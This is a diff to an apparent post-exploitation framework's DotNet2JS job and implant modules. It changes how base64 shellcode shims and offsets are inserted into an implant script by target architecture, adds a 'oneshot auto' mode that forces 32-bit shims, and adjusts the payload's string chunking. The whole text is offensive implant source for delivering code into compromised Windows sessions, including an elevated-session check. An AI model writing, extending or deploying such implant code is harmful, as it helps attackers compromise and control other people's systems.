@@ -5,17 +5,29 @@ import string
 
 class DotNet2JSJob(core.job.Job):
     def create(self):
+        self.fork32Bit = True
         arch = self.options.get("ARCH")
         if self.session_id == -1:
             if arch == 'auto':
-                self.error("0", "Job requires a defined ARCH when used with a ONESHOT. Set ARCH for this job and try again.", "Arch not defined", "")
-                return False
-            elif arch == '64':
-                self.script = self.script.replace(b"~SHIMB64~", self.options.get("SHIMX64B64").encode())
-                self.script = self.script.replace(b"~SHIMOFFSET~", self.options.get("SHIMX64OFFSET").encode())
-            elif arch == '32':
-                self.script = self.script.replace(b"~SHIMB64~", self.options.get("SHIMX86B64").encode())
-                self.script = self.script.replace(b"~SHIMOFFSET~", self.options.get("SHIMX86OFFSET").encode())
+                self.script = self.script.replace(b"~ONESHOTAUTO~", b"true")
+                self.script = self.script.replace(b"~SHIMB64~", b"false")
+                self.script = self.script.replace(b"~SHIMOFFSET~", b"false")
+                self.script = self.script.replace(b"~SHIMX64B64~", self.options.get("SHIMX86B64").encode())
+                self.script = self.script.replace(b"~SHIMX64OFFSET~", self.options.get("SHIMX86OFFSET").encode())
+                self.script = self.script.replace(b"~SHIMX86B64~", self.options.get("SHIMX64B64").encode())
+                self.script = self.script.replace(b"~SHIMX86OFFSET~", self.options.get("SHIMX64OFFSET").encode())
+            else:
+                self.script = self.script.replace(b"~ONESHOTAUTO~", b"false")
+                self.script = self.script.replace(b"~SHIMX64B64~", b"false")
+                self.script = self.script.replace(b"~SHIMX86B64~", b"false")
+                self.script = self.script.replace(b"~SHIMX64OFFSET~", b"false")
+                self.script = self.script.replace(b"~SHIMX86OFFSET~", b"false")
+                if arch == '64':
+                    self.script = self.script.replace(b"~SHIMB64~", self.options.get("SHIMX64B64").encode())
+                    self.script = self.script.replace(b"~SHIMOFFSET~", self.options.get("SHIMX64OFFSET").encode())
+                elif arch == '32':
+                    self.script = self.script.replace(b"~SHIMB64~", self.options.get("SHIMX86B64").encode())
+                    self.script = self.script.replace(b"~SHIMOFFSET~", self.options.get("SHIMX86OFFSET").encode())
             self.errstat = 0
             return
 
@@ -24,15 +36,23 @@ class DotNet2JSJob(core.job.Job):
             self.error("0", "This job requires an elevated session. Set IGNOREADMIN to true to run anyway.", "Not elevated", "")
             return False
 
+        self.script = self.script.replace(b"~ONESHOTAUTO~", b"false")
+        self.script = self.script.replace(b"~SHIMX64B64~", b"false")
+        self.script = self.script.replace(b"~SHIMX86B64~", b"false")
+        self.script = self.script.replace(b"~SHIMX64OFFSET~", b"false")
+        self.script = self.script.replace(b"~SHIMX86OFFSET~", b"false")
+
         # cant change this earlier, has to be job specific
         # i dont like it, but this is how we do this to make payload smaller
         if arch == 'auto':
-            if self.session.arch == "64":
-                self.script = self.script.replace(b"~SHIMB64~", self.options.get("SHIMX64B64").encode())
-                self.script = self.script.replace(b"~SHIMOFFSET~", self.options.get("SHIMX64OFFSET").encode())
-            else:
-                self.script = self.script.replace(b"~SHIMB64~", self.options.get("SHIMX86B64").encode())
-                self.script = self.script.replace(b"~SHIMOFFSET~", self.options.get("SHIMX86OFFSET").encode())
+            self.script = self.script.replace(b"~SHIMB64~", self.options.get("SHIMX86B64").encode())
+            self.script = self.script.replace(b"~SHIMOFFSET~", self.options.get("SHIMX86OFFSET").encode())
+            # if self.session.arch == "64":
+            #     self.script = self.script.replace(b"~SHIMB64~", self.options.get("SHIMX64B64").encode())
+            #     self.script = self.script.replace(b"~SHIMOFFSET~", self.options.get("SHIMX64OFFSET").encode())
+            # else:
+            #     self.script = self.script.replace(b"~SHIMB64~", self.options.get("SHIMX86B64").encode())
+            #     self.script = self.script.replace(b"~SHIMOFFSET~", self.options.get("SHIMX86OFFSET").encode())
         elif arch == '64':
             self.script = self.script.replace(b"~SHIMB64~", self.options.get("SHIMX64B64").encode())
             self.script = self.script.replace(b"~SHIMOFFSET~", self.options.get("SHIMX64OFFSET").encode())
@@ -144,7 +164,7 @@ class DotNet2JSImplant(core.implant.Implant):
                 if index % 150 == 0:
                     ret += '"+\r\n"'
 
-            ret += '";'
+            ret += '"'
             return ret
 
     def run(self):
